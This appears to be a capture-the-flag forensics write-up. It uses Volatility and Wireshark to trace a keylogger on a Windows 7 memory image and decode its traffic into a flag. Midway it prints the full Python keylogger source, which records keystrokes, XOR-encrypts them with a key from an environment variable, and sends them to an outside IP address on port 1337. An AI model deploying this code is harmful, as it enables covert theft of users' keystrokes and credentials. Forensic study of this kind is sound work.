We were given two files , a memdump and a packet capture 


```powershell
vol -f .\Evidence.vmem imageinfo
```

**Output:**
```
Volatility Foundation Volatility Framework 2.6
INFO    : volatility.debug    : Determining profile based on KDBG search...
          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_23418
                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)
                     AS Layer2 : FileAddressSpace (D:\DFIR-LABS\Evidence.vmem)
                      PAE type : No PAE
                           DTB : 0x187000L
                          KDBG : 0xf80002c070a0L
          Number of Processors : 1
     Image Type (Service Pack) : 1
                KPCR for CPU 0 : 0xfffff80002c08d00L
             KUSER_SHARED_DATA : 0xfffff78000000000L
           Image date and time : 2020-06-02 10:40:46 UTC+0000
     Image local date and time : 2020-06-02 16:10:46 +0530
```

 The memory dump is from a Windows 7 SP1 x64 system captured on June 2, 2020 at 10:40:46 UTC.





**Command:**
```powershell
vol -f .\Evidence.vmem --profile=Win7SP1x64 pslist
```


```
Offset(V)          Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Start                          Exit
------------------ -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------
0xfffffa8000ca19e0 System                    4      0     96      621 ------      0 2020-06-02 10:36:06 UTC+0000
0xfffffa80032bc4a0 explorer.exe           1100   1284     36      933      1      0 2020-06-02 10:36:38 UTC+0000
0xfffffa800347fb30 chrome.exe             2636   1100     34      866      1      0 2020-06-02 10:36:55 UTC+0000
0xfffffa8000f48b30 cmd.exe                3532   1100      1       19      1      0 2020-06-02 10:37:57 UTC+0000
0xfffffa8000f2d060 conhost.exe            3524    404      3       51      1      0 2020-06-02 10:37:57 UTC+0000
0xfffffa80030b0060 pythonw.exe            2216   1100      3      163      1      0 2020-06-02 10:40:36 UTC+0000
```

Suspicious process `pythonw.exe` (PID: 2216) was running, spawned by explorer.exe. This process was started just 10 seconds before the memory capture.




**Command:**
```powershell
vol -f .\Evidence.vmem --profile=Win7SP1x64 cmdscan
```

```
**************************************************
CommandProcess: conhost.exe Pid: 3524
CommandHistory: 0x32b620 Application: cmd.exe Flags: Allocated, Reset
CommandCount: 2 LastAdded: 1 LastDisplayed: 1
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x60
Cmd #0 @ 0x32a3a0: cd Desktop
Cmd #1 @ 0x2f7c40: cd ../Downloads/../Downloads
```

 The User navigated to Desktop and Downloads directories via command line


Investigating the python processes it's a keylogger 


```powershell
vol -f .\Evidence.vmem --profile=Win7SP1x64 cmdline -p 2216
```


```
************************************************************************
pythonw.exe pid:   2216
Command line : "C:\Python27\pythonw.exe" "C:\Python27\Lib\idlelib\idle.pyw" -e "C:\Users\Mike\Downloads\keylogger.py"
```

The pythonw.exe process was executing `keylogger.py` from the Downloads folder using Python's IDLE editor





**Command:**
```powershell
vol -f Evidence.vmem --profile=Win7SP1x64 filescan | Select-String "keylogger.py"
```

**Output:**
```
0x000000003ee119b0     16      0 R--rwd \Device\HarddiskVolume1\Users\Mike\Downloads\keylogger.py
```
 The keylogger file was located at memory offset `0x000000003ee119b0` with read/write permissions.



Then i extracted it 


**Command:**
```powershell
vol -f Evidence.vmem --profile=Win7SP1x64 dumpfiles -Q 0x000000003ee119b0 --dump-dir="D:\DFIR-LABS"
```

**Output:**
```
DataSectionObject 0x3ee119b0   None   \Device\HarddiskVolume1\Users\Mike\Downloads\keylogger.py
```

The keylogger was - 


```
import socket, os
from pynput.keyboard import Key, Listener
import socket

import logging
list1 = []

def keylog():
    dir = r"C:\Users\Mike\Desktop\key.log"
    logging.basicConfig(filename=dir, level=logging.DEBUG,format='%(message)s')

    def on_press(key):
        a = str(key).replace("u'","").replace("'","")
        list1.append(a)

    def on_release(key):
        if str(key) == 'Key.esc':
            print "Data collection complete. Sending data to master"
            logging.info(' '.join(list1))
            logging.shutdown()
            master_encrypt()
        

    with Listener(
        on_press = on_press,
        on_release = on_release) as listener:
        listener.join()

def send_to_master(data):
    s = socket.socket()
    host = '18.140.60.203'
    port = 1337
    
    s.connect((host, port))
    key_log = data
    s.send(key_log)
    s.close()
    exit(1)

def master_encrypt():
    mkey = os.getenv('t3mp')
    f = open("C:/Users/Mike/Desktop/key.log","r")
    modified = ''.join(f.readlines()).replace("\n","")
    f.close()
    data = master_xor(mkey, modified).encode("base64")
    os.unlink("C:/Users/Mike/Desktop/key.log")
    send_to_master(data)

def master_xor(msg,mkey):
    l = len(mkey)
    xor_complete = ""

    for i in range(0, len(msg)):
        xor_complete += chr(ord(msg[i]) ^ ord(mkey[i % l]))
    
    return xor_complete

if __name__ == "__main__":
    keylog()
```

Now lets see the packetcaptured file usign wireshark and since we have the ip , lets search for it . 


<img width="1919" height="1014" alt="image" src="https://github.com/user-attachments/assets/16373a27-828a-4f18-8d40-1ae17f12c3b3" />



It seems to be a b64 string , which makes sense as with the ky.py 

Also it has a sus variable called t3mp 

<img width="640" height="206" alt="image" src="https://github.com/user-attachments/assets/3ac3bf7e-6af2-4435-96ad-642e3d104d10" />


Lets see the envars using temp . 

<img width="1317" height="368" alt="image" src="https://github.com/user-attachments/assets/0b4d94c1-d7b9-4128-883d-8e318a15a014" />


Yea now we have everything we need . 


Just simply reversing using the xor but backwards gave us the flag :)







